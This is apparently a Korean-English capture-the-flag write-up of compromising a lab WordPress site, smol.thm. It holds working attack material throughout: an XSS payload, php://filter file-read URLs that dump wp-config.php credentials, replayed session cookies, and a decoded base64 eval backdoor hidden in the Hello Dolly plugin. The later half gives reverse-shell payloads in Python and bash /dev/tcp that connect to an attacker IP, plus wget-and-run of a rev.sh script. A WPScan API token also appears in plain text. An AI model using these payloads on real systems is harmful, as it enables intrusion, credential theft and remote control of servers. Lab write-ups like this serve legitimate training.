# IP: 10.10.97.230

# nmap -> 22, 80

http://www.smol.thm

Nmap scan report for 10.10.97.230
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 86:fb:3f:1f:18:c9:c9:32:cb:10:08:20:d0:f7:c3:58 (RSA)
| 256 ae:c8:74:d8:57:c1:26:67:92:b1:21:ef:9a:e0:c7:ea (ECDSA)
|\_ 256 59:77:71:a7:d8:b9:92:cc:00:e4:e3:b0:f9:16:03:f8 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://www.smol.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds

# 단서

# Suggested text: Our website address is: http://192.168.204.139.

# http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F

# ffuf -> 워드프레스 구조 확인

ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ffuf.txt -t 50

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://www.smol.thm/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
:: Output file : ffuf.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 50
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

:: Progress: [50/207643] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
[ERR] NOPE
wp-content [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4579ms]
wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 510ms]
wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 272ms]

# 결과 확인

```bash
sudo apt install jq
cat ffuf.txt | jq
```

# wpscan -> directory listing, CSRF, SSRF are found

wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

┌──(root㉿docker-desktop)-[/]
└─# wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

---

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

---

[+] URL: http://www.smol.thm/ [10.10.97.230]
[+] Started: Thu Jul 24 15:03:12 2025

Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
| - http://codex.wordpress.org/XML-RPC_Pingback_API
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
| - https://www.iplocation.net/defend-wordpress-from-ddos
| - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
| Found By: Rss Generator (Passive Detection)
| - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
| - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
| Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
| Last Updated: 2024-11-13T00:00:00.000Z
| Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
| [!] The version is out of date, the latest version is 1.6
| [!] Directory listing is enabled
| Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
| Style Name: Twenty Twenty-Three
| Style URI: https://wordpress.org/themes/twentytwentythree
| Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
| Author: the WordPress team
| Author URI: https://wordpress.org
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 1.2 (80% confidence)
| Found By: Style (Passive Detection)
| - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
| Latest Version: 1.07 (up to date)
| Last Updated: 2018-03-09T10:28:00.000Z
|
| Found By: Urls In Homepage (Passive Detection)
|
| [!] 2 vulnerabilities identified:
|

# 취약점

| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
| References:
| - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
| References:
| - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| Version: 1.07 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:11 <=============================================================================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] WPScan DB API OK
| Plan: free
| Requests Done (during the scan): 3
| Requests Remaining: 22

[+] Finished: Thu Jul 24 15:03:41 2025
[+] Requests Done: 176
[+] Cached Requests: 5
[+] Data Sent: 43.933 KB
[+] Data Received: 254.962 KB
[+] Memory used: 265.801 MB
[+] Elapsed time: 00:00:28

# 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속

# IP: 10.10.97.230, www.smol.thm -> CVE 취약점 확인

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8

![](https://velog.velcdn.com/images/agnusdei1207/post/9489e7ee-b9c5-4def-b337-13f30ef6321f/image.png)

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

![](https://velog.velcdn.com/images/agnusdei1207/post/b10129e7-2e41-42c0-b15d-76ed89c0c5f3/image.png)

```

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

# login

![](https://velog.velcdn.com/images/agnusdei1207/post/1d998ee7-0c88-412b-b447-5103a27aa833/image.png)

# Cookie Hijacking

![](https://velog.velcdn.com/images/agnusdei1207/post/f69cf5b3-c40e-4218-8d4c-afd383ab1e87/image.png)

# cookie (total 2)

Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070

# request test with cookie -> success

curl -i -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/

# 사이트 탐색 중 시스템 접근을 위한 데이터 수집

![](https://velog.velcdn.com/images/agnusdei1207/post/b6ccdc9b-2df6-4ca3-a428-a4277f4f3dc4/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/477f28cf-9889-4aef-8be6-8cedd95d97b1/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/b2331716-58bb-4853-864a-5c8847a2f124/image.png)

1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.

2- Set Up HTTPS: Configure an SSL certificate to enable HTTPS and encrypt data transmission.

3- Update Software: Regularly update your CMS, plugins, and themes to patch vulnerabilities.

4- Strong Passwords: Enforce strong passwords for users and administrators.

5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.

6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.

7- Backup Strategy: Set up regular backups of your website and databases.

8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.

9- Content Security Policy: Implement a CSP to control resource loading and prevent malicious scripts.

10- Secure File Uploads: Validate file types, use secure upload directories, and restrict execution permissions.

11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.

# hello dolly source code 구글링 -> https://github.com/WordPress/hello-dolly -> hello.php 플러그인 파일 확인

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

# LFI 파일을 기준으로 플러그인 파일 유추 -> 무작위 시도

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../hello.php

# http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

# 플러그인 파일 구조 (php)

# IP: 10.10.97.230

# 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
base64 -d hello.b64 > hello.php

```
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );

```

# base64 decode

# IP: 10.10.97.230

echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d

if (isset($_GET["\143\155\x64"])) { system($\_GET["\143\x6d\144"]); }

# printf 로 ascii 코드 디코딩 -> cmd 확인

┌──(root㉿docker-desktop)-[/]
└─# printf "\143\x6d\144\n"
cmd

┌──(root㉿docker-desktop)-[/]
└─# printf "\143\155\x64"
cmd

# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행 -> js는 php cmd 를 실행 -> 그렇다면 악성 RCE 명령어를 base64 로 encode 만 하면 될 것으로 보임

echo -n "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")" | base64

# payload manipulation

aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

# connecting to the target -> SSRF successful URL manipulation

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

http://www.smol.thm/wp-admin/?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=

# fail -> maybe directory listing...? -> 분명히 플러그인이 취약점인데..!

No such file or directory
bash: VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k: command not found
bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v: command not found

# http://www.smol.thm/wp-admin/index.php -> 관리자 페이지에서 플러그인 사용하는 것 확인 -> cmd 취약점이 가능한 페이지 찾기

![](https://velog.velcdn.com/images/agnusdei1207/post/203b4452-c71a-414a-b29c-86e95d1b2a8f/image.png)

# 아까 탈취했던 쿠키 활용

curl -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/profile.php?cmd=ls | bat -l html

# 중간에 쉬다와서 다시 쿠키 탈취 필요 (with burpsuite)

# IP: 10.10.97.230

POST /wp-login.php HTTP/1.1
Host: www.smol.thm
Content-Length: 168
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://www.smol.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: keep-alive

log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F&testcookie=1

# login -> gui 불편하니까 cli 환경으로 전환

curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt

# 이제 RCE 취약점이 있는 위치 탐색하기

curl -b cookie.txt -L http://www.smol.thm/wp-admin

# 바로 발견! -> 플러그인을 wp 전역에서 사용하는 걸로 보임

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls

about.php
admin-ajax.php
admin-footer.php
admin-functions.php
admin-header.php
admin-post.php
admin.php
async-upload.php
authorize-application.php
comment.php
contribute.php
credits.php
css
custom-background.php
custom-header.php
customize.php
edit-comments.php
edit-form-advanced.php
edit-form-blocks.php
edit-form-comment.php
edit-link-form.php
edit-tag-form.php
edit-tags.php
edit.php
erase-personal-data.php
export-personal-data.php
export.php
freedoms.php
images
import.php
includes
index.php
install-helper.php
install.php
js
link-add.php
link-manager.php
link-parse-opml.php
link.php
load-scripts.php
load-styles.php
maint
media-new.php
media-upload.php
media.php
menu-header.php
menu.php

# reverse shell 연결

curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=bash -i >& /dev/tcp/10.8.136.212/1234 0>&1

2. **리버스 쉘 스크립트 작성**

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
```

3. **공격자가 악성 스크립트 배포를 위한 서빙**

```bash
python3 -m http.server 6666
```

- 현재 디렉터리 파일을 6666 포트로 서비스함

4. **타겟에서 스크립트 다운로드**

```
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=wget http://10.8.136.212:6666/rev.sh -O /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/index.php?cmd=chmod +x /tmp/rev.sh
```

5. **타겟에서 리버스 쉘 실행**

```
http://www.smol.thm/wp-admin/index.php?cmd=bash /tmp/rev.sh
```
